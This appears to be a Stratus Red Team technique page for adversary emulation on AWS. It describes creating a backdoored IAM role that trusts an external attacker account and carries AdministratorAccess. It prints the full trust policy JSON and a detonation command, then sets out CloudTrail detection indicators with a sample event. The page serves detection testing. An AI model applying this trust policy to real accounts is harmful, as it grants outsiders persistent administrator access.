---
title: Create a backdoored IAM Role
---

# Create a backdoored IAM Role




Platform: AWS

## MITRE ATT&CK Tactics


- Persistence

## Description


Establishes persistence by creating a new backdoor role with a trust policy allowing it to be assumed from 
an external, fictitious attack AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: None.

<span style="font-variant: small-caps;">Detonation</span>: 

- Create a new IAM role with the following trust policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
```

- Attach the 'AdministratorAccess' managed IAM policy to it. 

References:

- https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.persistence.iam-create-backdoor-role
```
## Detection


- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.

- Identify a call to <code>CreateRole</code> closely followed by <code>AttachRolePolicy</code> with an administrator policy.

- Identify a call to <code>CreateRole</code> that contains an assumeRolePolicyDocument in the requestParameters that allows access from an external AWS account. Sample event:

```
{
  "eventSource": "iam.amazonaws.com",
  "eventName": "CreateRole",
  "requestParameters": {
	"roleName": "malicious-iam-role",
	"assumeRolePolicyDocument": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}"
   }
}
```


